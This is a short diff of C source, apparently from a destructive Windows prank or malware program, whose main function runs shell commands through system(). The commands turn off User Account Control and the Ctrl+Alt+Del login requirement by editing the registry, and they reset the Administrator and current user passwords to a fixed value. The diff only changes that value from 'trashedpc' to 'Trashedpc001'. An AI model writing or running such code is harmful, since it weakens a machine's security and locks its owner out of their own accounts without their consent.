@@ -100,8 +100,8 @@ int main()
         system("REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f");
         system("REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DisableCAD /t REG_DWORD /d 0 /f");
 
-        system("net user Administrator trashedpc");
-        system("net user %USERNAME% trashedpc");
+        system("net user Administrator Trashedpc001");
+        system("net user %USERNAME% Trashedpc001");
       
         system("explorer.exe");
       
